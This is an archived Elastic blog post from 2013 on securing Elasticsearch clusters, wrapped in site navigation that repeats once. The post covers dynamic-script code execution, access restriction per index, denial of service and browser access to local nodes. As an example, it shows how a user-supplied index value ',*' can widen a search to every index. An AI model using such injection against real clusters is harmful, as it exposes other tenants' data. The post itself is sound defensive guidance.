=== Content from www.found.no_09c1b59c_20250125_070659.html ===
[Skip to main content](#main-content)[Elastic](/)ENClose panel

* Deutsch
* English
* Español
* Français
* 日本語
* 한국어
* 简体中文
* Português
Search[Login](https://cloud.elastic.co)Toggle Navigation[Start free trial](https://cloud.elastic.co/registration)[Contact Sales](/contact)PlatformClose panel[## The Search AI Company](/platform)[![Search, Security, Observability](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltb72b02d269f3201a/6643847599f5a8667dc35ac7/nav-platform.png)](/platform)

Build tailored experiences with Elastic.

[Elastic Search AI Platform overview](/platform)

---

**Scale your business with Elastic Partners**

* [Find a partner](https://partners.elastic.co/findapartner/)
* [Become a partner](/partners/become-a-partner)
[Partner overview](/partners)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt0090c6239e64faf8/62aa0980c949fd5059e8aebc/logo-stack-32-color.svg)
## ELK Stack

Search and analytics, data ingestion, and visualization – all at your fingertips.

* [Kibana](/kibana)
* [Elasticsearch](/elasticsearch)
* [Integrations](/integrations)

[ELK Stack overview](/elastic-stack)

---

**By developers, for developers**

* [Try the world's most used vector database](/elasticsearch/vector-database)
* [Scale with the low-latency Search AI Lake](/blog/search-ai-lake-elastic-cloud-serverless)
* [Join our community](/community)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltdb0f38c35ae455dc/5d07f086877575d0584760a3/logo-cloud-24-color.svg)
## Elastic Cloud

Unlock the power of real-time insights with Elastic on your preferred cloud provider.

[Elastic Cloud overview](/cloud)

---

* [Elastic Cloud Serverless](/cloud/serverless)
* [Elastic Cloud Serverless pricing](/pricing/serverless-search)
* [Search AI Lake](/cloud/serverless/search-ai-lake)
SolutionsClose panel[## Generative AI](/generative-ai)

Prototype and integrate with LLMs faster using search AI.

* [Search AI Lake](/cloud/serverless/search-ai-lake)
* [Elastic AI Assistant](/elasticsearch/ai-assistant)
* [Retrieval Augmented Generation](/enterprise-search/rag)

---

* [Generative AI blogs](/blog/category/generative-ai)
* [Search Labs tutorials](https://www.elastic.co/search-labs/tutorials)
* [Elastic Community](/community)
[Generative AI overview](/generative-ai) [![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt549f7d977c2a88f4/5d082d34616162aa5a85707d/logo-enterprise-search-32-color.svg)](/enterprise-search)[## Search](/enterprise-search)

Discover a world of AI possibilities — built with the power of search.

* [Vector database](/elasticsearch/vector-database)
* [Relevance](/enterprise-search/relevance)
* [Search applications](/enterprise-search/search-applications)
* [Ecommerce](/enterprise-search/ecommerce)
* [Website search](/enterprise-search/site-search)
* [Workplace search](/enterprise-search/workplace-search)
* [Customer support](/enterprise-search/customer-support)

---

* [Search Labs](https://www.elastic.co/search-labs)
[Search overview](/enterprise-search)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltf58b7c8e04706979/5e20f1a8132ead1155e8d0a4/logo-security-32-color.svg)](/security)[## Security](/security)

Protect, investigate, and respond to cyber threats with AI-driven security analytics.

* [SIEM](/security/siem)
* [AI for the SOC](/security/ai)
* [Threat Research](/security/cyber-threat-research)

---

* [Security Labs](https://www.elastic.co/security-labs)
[Security overview](/security)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltbf6ba0d0e0e1e5ab/5e20f19a2aa8e40a75136318/logo-observability-32-color.svg)](/observability)[## Observability](/observability)

Unify app and infrastructure visibility to proactively resolve issues.

* [Log monitoring and analytics](/observability/log-monitoring)
* [OpenTelemetry](/observability/opentelemetry)
* [Application performance monitoring](/observability/application-performance-monitoring)
* [Infrastructure monitoring](/observability/infrastructure-monitoring)
* [Synthetic monitoring](/observability/synthetic-monitoring)
* [Real user monitoring](/observability/real-user-monitoring)
* [Universal Profiling](/observability/universal-profiling)
* [AIOps](/observability/aiops)

---

* [Observability Labs](https://www.elastic.co/observability-labs)
[Observability overview](/observability)CustomersClose panel[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltacc5e178e52f430e/647ccc7b6be35fb5eabd2100/icon-checkmark-decorative-border.svg)](/customers)[## By solution](/customers)

See how customers search, solve, and succeed — all on one Search AI Platform.

* [Search](/customers/success-stories?usecase=enterprise-search&industry=All)
* [Security](/customers/success-stories?usecase=security-analytics&industry=All)
* [Observability](/customers/success-stories?usecase=elastic-observability&industry=All)
[All customer stories](/customers)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt9f634b6f74878698/647ccc625637890f19859454/icon-briefcase.svg)](/industries)[## Industries](/industries)

Exceed customer expectations and go to market faster.

* [Public sector](/industries/public-sector)
* [Financial services](/industries/financial-services)
* [Telecommunications](/industries/telecommunications)
* [Retail](/industries/retail-ecommerce)
* [Manufacturing](/industries/manufacturing)
[Industries overview](/industries)
## Customer spotlight

![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt652fec920f2b1a14/650c1d87aa86c13fa1cc288c/logo-nav-dropdown-48x48-cisco.svg)

Cisco saves 5,000 support engineer hours per month

[Read more](/customers/cisco)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte788c0f923f209a3/668c49f5534bb913eb26e9e8/logo-dropdown-48x48-sitecore.svg)

Sitecore automates 96 percent of security workflows with Elastic

[Read more](/customers/sitecore-security)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt90a52ed02808cbc1/650c1dadb25642d90add1e4e/logo-nav-dropdown-48x48-comcast.svg)

Comcast transforms customer experiences with Elastic Observability

[Read more](/customers/comcast)ResourcesClose panel![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Research

Stay at the forefront of innovation with technical tips from the experts.

* [Search Labs](https://www.elastic.co/search-labs)
* [Security Labs](https://www.elastic.co/security-labs)
* [Observability Labs](https://www.elastic.co/observability-labs)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Build

Code with other developers to create a better Elastic, together.

* [Community](/community)
* [Forum](https://discuss.elastic.co)
* [Downloads](/downloads)
* [Documentation](/guide)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Learn

Unleash the possibilities of your data and grow your skill set.

* [Getting started](/getting-started)
* [Elastic resources](/learn)
* [Consulting services](/consulting)
* [Trainings & certifications](/training)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Connect

Keep informed about the latest tech and news from Elastic.

* [Blog](/blog)
* [Events](/events)

---

Have questions?

* [Contact sales](/contact?storm=global-header-en)
* [Get support](/support)
[Pricing](/pricing)[Docs](https://www.elastic.co/docs)

New

[Read more](https://www.elastic.co/portfolio/operationalizing-generative-ai-strategic-guide)[About us](https://www.elastic.co/about)[Partners](https://www.elastic.co/partners)[Support](https://www.elastic.co/support)|[Login](https://cloud.elastic.co/login)

* Products
* Solutions
* Why Elastic?
* Resources
[Pricing](https://www.elastic.co/pricing)[Docs](https://www.elastic.co/docs)SearchStart free trialContact sales09 December 2013
# Securing Your Elasticsearch Cluster

By[Alex Brasetvik](/blog/author/alex-brasetvik)

Share

* Share on Twitter
* Share on Facebook
* Share on LinkedInr

| **February 6, 2019:** Looking for the best way secure your Elasticsearch data? Spin up a cluster on our [Elasticsearch Service](/cloud/elasticsearch-service) or check out our [subscriptions](/subscriptions) for your existing deployment. Both options enable [security features](/products/stack/security) like encrypted communication, role-based access control, authentication realms (native, LDAP, Active Directory, etc.), single-sign on, and more. Please note that the following article was authored before this security functionality was available. |
| --- |

***UPDATE:** This article refers to our hosted Elasticsearch offering by an older name, Found. Please note that Found is now known as the [Elasticsearch Service](https://www.elastic.co/cloud/elasticsearch-service).*

## A Brief Overview of Running Elasticsearch Securely

Elasticsearch does not perform authentication or authorization, leaving that as an exercise for the developer. This article gives an overview of things to keep in mind when you configure the security settings for your Elasticsearch cluster, providing users with (limited) access to your cluster when you cannot necessarily (entirely) trust them.

## [Introduction](#introduction)

As an Elasticsearch provider, security is of paramount importance to Found. We need to protect our users from others with possibly nefarious intents, in addition to protecting users from causing trouble for themselves.

This article builds upon [Elasticsearch in production](/blog/found-elasticsearch-in-production), where we introduced many of the security related topics discussed here. We expand on these in this article and elaborate on some areas to keep in mind when actually implementing them.

Essentially, you need to carefully scrutinize requests you send to Elasticsearch; just like any other database. *Unlike* most other databases, however, Elasticsearch has a feature allowing arbitrary code execution. That poses some interesting challenges!

We'll look at nuances in the various levels of trust you can give your users, and the risks imposed; from arbitrary requests with full access on one end, to just parameterized pre-defined requests on the other end.

## [Responsibility](#responsibility)

> Elasticsearch has no concept of a user. Essentially, anyone that can send arbitrary requests to your cluster is a “super user”.

If you are used to systems like PostgreSQL, where you limit access to databases tables, functions, etc. with high granularity, you might be trying to find a way to limit access to certain operations and/or certain indexes. At the moment, Elasticsearch does not consider that to be its job. Elasticsearch has no concept of a user. Essentially, anyone that can send arbitrary requests to your cluster is a “super user”. It's a reasonable limitation to impose. There are so many ways to implement various authentication and authorization schemes, and many of them are closely coupled to the application domain.

A lot of the advice here applies to search engines and databases other than Elasticsearch as well. We do not mean to imply that these are inherently insecure, or criticize their choices. It is a perfectly reasonable decision to leave security to the user. However, we want to raise awareness about Elasticsearch and security related aspects.

## [Goals](#goals)

Ordered by importance, we want to achieve the following:

1. Prevent usage of the script feature for execution of arbitrary code. If we are unable to do so, anything else is merely “[security through obscurity](http://en.wikipedia.org/wiki/Security_through_obscurity)” that can be bypassed. Disabling dynamic scripts introduces some challenges on its own, though.
2. Limit who can access what: both for searching and for indexing. This can be achieved to some extent with a proxy layer.
3. Preventing requests that can overwhelm the cluster and cause a denial of service. This is hard to completely prevent if arbitrary search requests are allowed.

We'll also see how these things apply even when running Elasticsearch locally for development purposes.

As an example of different levels of trust, assume you have multiple installs of the same CMS for different customers. You somewhat trust the CMS not to do crazy things, but it's still a good idea to require authentication and have separate indexes, just in case. Therefore, you can permit the CMS access to do arbitrary requests to its allowed indexes. The CMS, however, is exposed to the world. It does *not* accept any arbitrary requests. It translates search parameters into the proper Elasticsearch request, and sends it to the appropriate indexes.

## [Scripting for Fun and Profit](#scripting-for-fun-and-profit)

> End users that can provide scripts must be assumed to [have shell access](http://blog.liftsecurity.io/2013/11/30/elasticsearch-command-execution-using-script) to your host.

Elasticsearch has very powerful scripting facilities. These are important in many contexts: updates, facets, filters, scoring, and so on.

These scripts are *not* run in a [sandbox](http://en.wikipedia.org/wiki/Sandbox_%28computer_security%29). Consequently, end users that can provide scripts must be assumed to have the [equivalent of shell access](http://blog.liftsecurity.io/2013/11/30/elasticsearch-command-execution-using-script) to your host.

There is nothing preventing a script from sending a second request back to Elasticsearch - thus evading any URL-based access control - or from doing *anything* the Elasticsearch has access to. As a result, **[dynamic scripts must be disabled](/guide/en/elasticsearch/reference/current/modules-scripting.html#_disabling_dynamic_scripts) if you cannot *entirely* trust your user**.

As such, we advise against having dynamic scripts enabled and attempting to blacklist or sanitize scripts. It is very difficult to reason that a script is not doing bad things when its execution is not sandboxed. Flash and Java applet's history of security problems attest to how difficult it is to create a sandbox without vulnerabilities. Also, it is [provably impossible to reason whether a script will terminate](http://en.wikipedia.org/wiki/Halting_problem) or spin and cause denial of service.

### [Scripting without Dynamic Scripts](#scripting-without-dynamic-scripts)

We have emphasized the importance of disabling dynamic scripts. They are important for lots of things, so we need to ensure that we still achieve those things. Therefore, we'll look at some examples of using [preloaded scripts](/guide/en/elasticsearch/reference/current/modules-scripting.html#_preloaded_scripts) that can take parameters at search time.

Preloaded scripts can be placed in the `config/scripts`-directory.

Assume we have the following script:

```
$ cat config/scripts/scoring/recency_boost.mvel
(0.08 / ((3.16*pow(10,-11)) * abs(now - doc['timestamp'].date.getMillis()) + 0.05)) + 1.0

```

Then, we can specify e.g. `{"script": "scoring_recency_boost", "params": {"now": 1386176910000}}`. The `script`-parameter is the path to the script relative to `config/scripts`, with `_` as path separator. Note that the prefix is `scoring_` and not `scoring/`.

Using preloaded scripts offers another benefit: your script definitions are specified in one place, and not scattered around in the various applications that use your Elasticsearch cluster. This helps increase the maintainability of your search applications and profiles. You can change and improve your scripts without having to change every client using the scripts.

## [Limiting Indexes and Operations](#limiting-indexes-and-operations)

**Note:** This section assumes using the HTTP-API. Currently, there is no way to easily restrict what a transport client can do.

Elasticsearch has many ways of specifying what indexes to search across, or index to. If you have different users on the same shared cluster and let them send arbitrary search requests (though without scripts), you may also want to restrict what indexes they can access.

Typically, the indexes are specified in the URL of the request, i.e. `index_pattern/type_pattern/_search`. However, there are also APIs like [multi-search](/guide/en/elasticsearch/reference/current/search-multi-search.html), [multi-get](/guide/en/elasticsearch/reference/current/docs-multi-get.html) and [bulk](/guide/en/elasticsearch/reference/current/docs-bulk.html) that can take index as a parameter in the request body as well, thus overriding what indexes get searched or where documents get indexed. In 0.90.4, the configuration option [`allow_explicit_index`](/guide/en/elasticsearch/reference/current/url-access-control.html) was introduced that lets you forbid these overrides.

Note that the index is actually an index *pattern* and not necessarily an index name. Thus, if you are prefixing your indexes with something user specific, you must consider index patterns as well. For example, just doing `index_name = "user123_" + user_specified_index` would not work very well if `user_specified_index = ",*"`. The request would end up as a request to `user123_,*/_search`, and the search would run on every index.

With `disable_dynamic_scripts` set to true and `allow_explicit_index` set to false, you can be certain that requests sent to `_search`- and `_msearch/_mget`-endpoints can only touch the explicitly allowed indexes, and similarly for indexing requests to `_bulk`. This makes it possible to let a proxy layer limit what indexes the forwarded requests can touch.

To also restrict what *documents* can be operated on, you can use a [filtered alias](/guide/en/elasticsearch/reference/current/indices-aliases.html#filtered). Any search, count, more like this and delete by query requests will have the filter applied. If you rely on these, make sure the underlying indexes cannot be accessed.

Having restricted what indexes and endpoints your users can send requests to, you must also consider what *methods* to allow. You probably don't want to allow anyone access to `DELETE` an index. Since it's a good practice to have [idempotent requests](/blog/found-elasticsearch-in-production/#idempotent-requests), it might be a good idea to disallow requests directly to the index anyway, just allowing POST-ing to endpoints like `_search` or `_bulk` or PUT-ing and DELETE-ing specific documents.

## [Preventing Denial of Service](#preventing-denial-of-service)

While not as harmful as exposing data, requests that can crash your cluster or severely impact its performance must be avoided as well. Unfortunately, avoiding them is not as easy as flipping a configuration variable.

The article on [Elasticsearch in production](/blog/found-elasticsearch-in-production) has a section on [OutOfMemory-caused crashes](/blog/found-elasticsearch-in-production/#outofmemory-caused-crashes). In short, running out of memory can have catastrophical impact on your cluster, and it should never happen on a production cluster.

There are many things that can consume a lot of memory in Elasticsearch. While not an exhaustive list, these are some examples:

* Field caches for fields to facet, sort and script on.
* Filter caches.
* Segments pending flushing.
* Index metadata.

Loading a field that is or has grown too large is probably the most common cause of running out of memory. Two important improvements are coming in Elasticsearch 1.0 to better deal with this:

The first is [document values](/blog/disk-based-field-data-a-k-a-doc-values). By enabling these in your mapping, Elasticsearch will write the document's values in a way that makes it possible to rely on the operating system's page cache to efficiently use the values. This can massively reduce the amount of memory required for the heap space, although this approach can be a bit slower as well.

The second improvement, while not commited to master at the time of writing, is a [circuit breaker](https://github.com/elasticsearch/elasticsearch/pull/4261). Its purpose is to impose a limit on how much memory can be used to load the field, breaking if the limit is exceeded. It defaults to being disabled, but with a sensible limit, requests attempting to load too much will break with a `CircuitBreakingException`, which is a lot safer than an `OutOfMemory` error!

Both require a bit of tweaking and planning ahead. While these help a lot in terms memory utilization, there is still a heavy performance impact when miss-loading a huge field. Other fields that are really needed can be expunged, forcing them to be loaded again.

If you allow indexing arbitrarily structured documents, you probably want to disable *[dynamic mapping](/guide/en/elasticsearch/reference/current/mapping-object-type.html#_dynamic)*. While Elasticsearch is often described as a [schemaless database](/blog/found-elasticsearch-as-nosql/#schema-flexible), Elasticsearch implicitly creates a schema. This works well when developing, but should probably be off in production. For example, it can cause problems if values appear as *keys* in your object:

Say you have an object like `{"access": [ {"123": "read"}, {"124": "write"} ]}`. While seemingly innocuous, this will cause an entry in the mapping for every ID. With thousands or millions of keys like this, the size of the mapping will explode, as there will be an entry per key. The mapping is also part of the cluster state, which is replicated to every node. Having values as keys can work well with document oriented databases that have no concept of a schema and treat documents as blobs. With Elasticsearch, however, you should never have values in your keys. Instead, this example could be `{"access": [ {"user_id": 123, "level": "read"}, {"user_id": 124: "level": "write"} ] }`, with `access` as a nested type.

In short, while it is possible to restrict which indexes can be searched or indexed to with a simple proxy layer, it is not possible to pass through arbitrary requests without risking the stability and performance of the cluster. This is the case for just about any database or search engine and should not be much of a surprise. We see this approach a lot, though. [Kibana](/products/kibana) does it with great success. For Kibana it makes a lot of sense, as it's largely an Elasticsearch dashboard. But if you copy its usage patterns and re-implement them in your end user facing applications, you also bring the risks mentioned here.

## [Staying Safe while Developing with Elasticsearch](#staying-safe-while-developing-with-elasticsearch)

Elasticsearch is typically used through HTTP, binding to `localhost`. Intuitively, external hosts cannot connect to something listening to `localhost` or that is protected by a company firewall. However, *your* web browser can reach your localhost, and might be able to reach servers on your company's internal network.

Any website you visit can send requests to your local Elasticsearch node. Your browser will happily do an HTTP-request to `127.0.0.1/_search`. Consequently, any website can go spelunking in whatever data is in your locally running Elasticsearch. It could then POST its findings somewhere. Adjusting the [settings for cross-origin resource sharing](/guide/en/elasticsearch/reference/current/modules-http.html#_settings_3) can help a bit, although it would still be possible to search using JSONP-requests.

Our warnings about dynamic scripts apply here as well. You certainly don't want any website out there to be able to run code on your machine!

We recommend running Elasticsearch in a virtual machine while developing on the same machine you use to surf the web. Don't have sensitive data locally, and keep dynamic scripts disabled.

## [Suggested Solutions](#suggested-solutions)

Restricting access to indexes and adding authentication and SSL can be done with numerous tools. Implementing it is outside the scope of this article. Nginx is quite popular for this. Additionally, there are various Elasticsearch plugins that attempt to add things like basic auth. At Found we provide this as part of our proxy layer that routes requests. You can configure ACLs that implement HTTP basic auth, SSL, and restrict what methods and paths can be accessed. Additionally, these rules can be combined to fit nearly any situation. Most Elasticsearch clients now support HTTP basic auth, SSL, and other goodies, including the official clients; so there is no excuse to not use them.

Even though Elasticsearch is multi-tenant and can happily serve many different users and applications on the same cluster, at some point you might want to create multiple clusters to partition resources and provide for additional security. Essentially, you want to reduce the impact area of the problems and risks described in the section on [Preventing denial of service]. For example, if you have a huge spike in traffic, the increase in logging throughput (which you use Logstash and Kibana to capture an analyze, right?) should not impact the performance of more important applications.

Today, it's easier than ever to use technologies like [LXC](http://en.wikipedia.org/wiki/LXC) and [Docker](https://www.docker.io) to isolate processes, and constrain resource usage like disk space, memory and CPU. That is exactly [what we do at Found](/blog/found-elasticsearch-in-production/#what-found-does-1). Customer clusters are completely isolated and resources are dedicated, not overprovisioned. This is very important, without these practices we would not be able to guarantee an acceptable level of security and performance would be unreliable.

## [Key Takeaways](#key-takeaways)

This article has covered a lot of ground, but be sure to keep in mind the following.

1. Disable dynamic scripts. They are dangerous.
2. Understand the sometimes tricky configuration is required to limit access controls to indexes.
3. Consider the performance implications of multiple tenants, a weakness or a bad query in one can bring down an entire cluster!

Cool stuff is continuously trickling into Elasticsearch, which is being developed at a mind-blowing pace. Some of these improvements will make life easier when dealing with a few of the challenges mentioned here. Others may introduce new challenges.

You should always assume that security is left to you. Remember, security is an onion, and good strategies have multiple layers. Don't let Elasticsearch be a weak layer in your application's security onion!

[![Elastic home](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf8467a95eaa27e4a/6638d7da0d02e4e98155aaa3/logo-tagline_secondary_all_white-177.svg)](/)
## Follow us

* [![Elastic's LinkedIn page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte7cfb1a091901ce1/5eb00c925751b2150e57a9d6/footer-icon-linkedin.svg)](https://www.linkedin.com/company/elastic-co)
* [![Elastic's YouTube page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt7c28b18be98b1af8/5eb00ca908d37e6d82ef7655/footer-icon-youtube.svg)](https://www.youtube.com/user/elasticsearch)
* [![Elastic's Facebook page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt75566c5278ad68da/5eb00c59d238e314f259fbea/footer-icon-facebook.svg)](https://www.facebook.com/elastic.co)
* [![Elastic's Twitter page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt341fed86979a9fbb/5eb00c76b8a6356e4ddc1180/footer-icon-twitter.svg)](https://www.twitter.com/elastic)
* [![Elastic's GitHub page](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt6ef5841a45696d80/64ca2a6fc530871313bc3822/icon-footer-github.svg)](https://github.com/elastic)

* ## About us

  [About Elastic](/about/)[Leadership](/about/leadership)[DE&I](/careers/diversity-and-inclusion)[Blog](/blog)[Newsroom](/about/press)
* ## Join us

  [Careers](/careers)[Career portal](https://jobs.elastic.co/#/)[How we hire](/careers/how-we-hire)

* ## Partners

  [Find a partner](https://partners.elastic.co/findapartner/)[Partner login](https://login.elastic.co/login/partner)[Request access](https://partners.elastic.co/English/register_email.aspx)[Become a partner](/partners/become-a-partner)
* ## Trust & Security

  [Trust center](/trust)[EthicsPoint portal](https://secure.ethicspoint.com/domain/media/en/gui/74447/index.html)[ECCN report](/trust/business-integrity#international-trade-compliance—eccn-information)Ethics email

* ## Investor relations

  [Investor resources](https://ir.elastic.co/home/default.aspx)[Governance](https://ir.elastic.co/governance/corporate-governance/default.aspx)[Financials](https://ir.elastic.co/financials/quarterly-results/default.aspx)[Stock](https://ir.elastic.co/stock/stock-quote/default.aspx)
* ## Excellence Awards

  [Previous winners](/blog/2022-elastic-excellence-awards-winners)[ElasticON Tour](/elasticon)[Become a sponsor](/events/sponsor)[All events](/events/)

## About us

[About Elastic](/about/)[Leadership](/about/leadership)[DE&I](/careers/diversity-and-inclusion)[Blog](/blog)[Newsroom](/about/press)
## Join us

[Careers](/careers)[Career portal](https://jobs.elastic.co/#/)[How we hire](/careers/how-we-hire)
## Partners

[Find a partner](https://partners.elastic.co/findapartner/)[Partner login](https://login.elastic.co/login/partner)[Request access](https://partners.elastic.co/English/register_email.aspx)[Become a partner](/partners/become-a-partner)
## Trust & Security

[Trust center](/trust)[EthicsPoint portal](https://secure.ethicspoint.com/domain/media/en/gui/74447/index.html)[ECCN report](/trust/business-integrity#international-trade-compliance—eccn-information)Ethics email
## Investor relations

[Investor resources](https://ir.elastic.co/home/default.aspx)[Governance](https://ir.elastic.co/governance/corporate-governance/default.aspx)[Financials](https://ir.elastic.co/financials/quarterly-results/default.aspx)[Stock](https://ir.elastic.co/stock/stock-quote/default.aspx)
## Excellence Awards

[Previous winners](/blog/2022-elastic-excellence-awards-winners)[ElasticON Tour](/elasticon)[Become a sponsor](/events/sponsor)[All events](/events/)

* [Trademarks](/legal/trademarks)
* [Terms of Use](/legal/terms-of-use)
* [Privacy](/legal/privacy-statement)
* [Sitemap](/sitemap)

© . Elasticsearch B.V. All Rights Reserved

Elastic, Elasticsearch and other related marks are trademarks, logos or registered trademarks of Elasticsearch B.V. in the United States and other countries.

Apache, Apache Lucene, Apache Hadoop, Hadoop, HDFS and the yellow elephant logo are trademarks of the [Apache Software Foundation](https://www.apache.org/) in the United States and/or other countries. All other brand names, product names, or trademarks belong to their respective owners.



=== Content from www.elastic.co_6e12f8f4_20250125_070656.html ===
[Skip to main content](#main-content)[Elastic](/)ENClose panel

* Deutsch
* English
* Español
* Français
* 日本語
* 한국어
* 简体中文
* Português
Search[Login](https://cloud.elastic.co)Toggle Navigation[Start free trial](https://cloud.elastic.co/registration)[Contact Sales](/contact)PlatformClose panel[## The Search AI Company](/platform)[![Search, Security, Observability](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltb72b02d269f3201a/6643847599f5a8667dc35ac7/nav-platform.png)](/platform)

Build tailored experiences with Elastic.

[Elastic Search AI Platform overview](/platform)

---

**Scale your business with Elastic Partners**

* [Find a partner](https://partners.elastic.co/findapartner/)
* [Become a partner](/partners/become-a-partner)
[Partner overview](/partners)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt0090c6239e64faf8/62aa0980c949fd5059e8aebc/logo-stack-32-color.svg)
## ELK Stack

Search and analytics, data ingestion, and visualization – all at your fingertips.

* [Kibana](/kibana)
* [Elasticsearch](/elasticsearch)
* [Integrations](/integrations)

[ELK Stack overview](/elastic-stack)

---

**By developers, for developers**

* [Try the world's most used vector database](/elasticsearch/vector-database)
* [Scale with the low-latency Search AI Lake](/blog/search-ai-lake-elastic-cloud-serverless)
* [Join our community](/community)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltdb0f38c35ae455dc/5d07f086877575d0584760a3/logo-cloud-24-color.svg)
## Elastic Cloud

Unlock the power of real-time insights with Elastic on your preferred cloud provider.

[Elastic Cloud overview](/cloud)

---

* [Elastic Cloud Serverless](/cloud/serverless)
* [Elastic Cloud Serverless pricing](/pricing/serverless-search)
* [Search AI Lake](/cloud/serverless/search-ai-lake)
SolutionsClose panel[## Generative AI](/generative-ai)

Prototype and integrate with LLMs faster using search AI.

* [Search AI Lake](/cloud/serverless/search-ai-lake)
* [Elastic AI Assistant](/elasticsearch/ai-assistant)
* [Retrieval Augmented Generation](/enterprise-search/rag)

---

* [Generative AI blogs](/blog/category/generative-ai)
* [Search Labs tutorials](https://www.elastic.co/search-labs/tutorials)
* [Elastic Community](/community)
[Generative AI overview](/generative-ai) [![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt549f7d977c2a88f4/5d082d34616162aa5a85707d/logo-enterprise-search-32-color.svg)](/enterprise-search)[## Search](/enterprise-search)

Discover a world of AI possibilities — built with the power of search.

* [Vector database](/elasticsearch/vector-database)
* [Relevance](/enterprise-search/relevance)
* [Search applications](/enterprise-search/search-applications)
* [Ecommerce](/enterprise-search/ecommerce)
* [Website search](/enterprise-search/site-search)
* [Workplace search](/enterprise-search/workplace-search)
* [Customer support](/enterprise-search/customer-support)

---

* [Search Labs](https://www.elastic.co/search-labs)
[Search overview](/enterprise-search)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltf58b7c8e04706979/5e20f1a8132ead1155e8d0a4/logo-security-32-color.svg)](/security)[## Security](/security)

Protect, investigate, and respond to cyber threats with AI-driven security analytics.

* [SIEM](/security/siem)
* [AI for the SOC](/security/ai)
* [Threat Research](/security/cyber-threat-research)

---

* [Security Labs](https://www.elastic.co/security-labs)
[Security overview](/security)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltbf6ba0d0e0e1e5ab/5e20f19a2aa8e40a75136318/logo-observability-32-color.svg)](/observability)[## Observability](/observability)

Unify app and infrastructure visibility to proactively resolve issues.

* [Log monitoring and analytics](/observability/log-monitoring)
* [OpenTelemetry](/observability/opentelemetry)
* [Application performance monitoring](/observability/application-performance-monitoring)
* [Infrastructure monitoring](/observability/infrastructure-monitoring)
* [Synthetic monitoring](/observability/synthetic-monitoring)
* [Real user monitoring](/observability/real-user-monitoring)
* [Universal Profiling](/observability/universal-profiling)
* [AIOps](/observability/aiops)

---

* [Observability Labs](https://www.elastic.co/observability-labs)
[Observability overview](/observability)CustomersClose panel[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltacc5e178e52f430e/647ccc7b6be35fb5eabd2100/icon-checkmark-decorative-border.svg)](/customers)[## By solution](/customers)

See how customers search, solve, and succeed — all on one Search AI Platform.

* [Search](/customers/success-stories?usecase=enterprise-search&industry=All)
* [Security](/customers/success-stories?usecase=security-analytics&industry=All)
* [Observability](/customers/success-stories?usecase=elastic-observability&industry=All)
[All customer stories](/customers)[![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt9f634b6f74878698/647ccc625637890f19859454/icon-briefcase.svg)](/industries)[## Industries](/industries)

Exceed customer expectations and go to market faster.

* [Public sector](/industries/public-sector)
* [Financial services](/industries/financial-services)
* [Telecommunications](/industries/telecommunications)
* [Retail](/industries/retail-ecommerce)
* [Manufacturing](/industries/manufacturing)
[Industries overview](/industries)
## Customer spotlight

![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt652fec920f2b1a14/650c1d87aa86c13fa1cc288c/logo-nav-dropdown-48x48-cisco.svg)

Cisco saves 5,000 support engineer hours per month

[Read more](/customers/cisco)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte788c0f923f209a3/668c49f5534bb913eb26e9e8/logo-dropdown-48x48-sitecore.svg)

Sitecore automates 96 percent of security workflows with Elastic

[Read more](/customers/sitecore-security)![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt90a52ed02808cbc1/650c1dadb25642d90add1e4e/logo-nav-dropdown-48x48-comcast.svg)

Comcast transforms customer experiences with Elastic Observability

[Read more](/customers/comcast)ResourcesClose panel![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Research

Stay at the forefront of innovation with technical tips from the experts.

* [Search Labs](https://www.elastic.co/search-labs)
* [Security Labs](https://www.elastic.co/security-labs)
* [Observability Labs](https://www.elastic.co/observability-labs)
![](https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt96bf0c70d7851e7d/64b6cd8378402d4f9cc28b43/icon-code-self-closing.svg)
## Build

Code with other developers to create a better Elastic, together.

* [Community](/community)
* [Forum](https://discuss.elastic.co)
* [Downloads](/downloads)
* [Documentation](/guide)
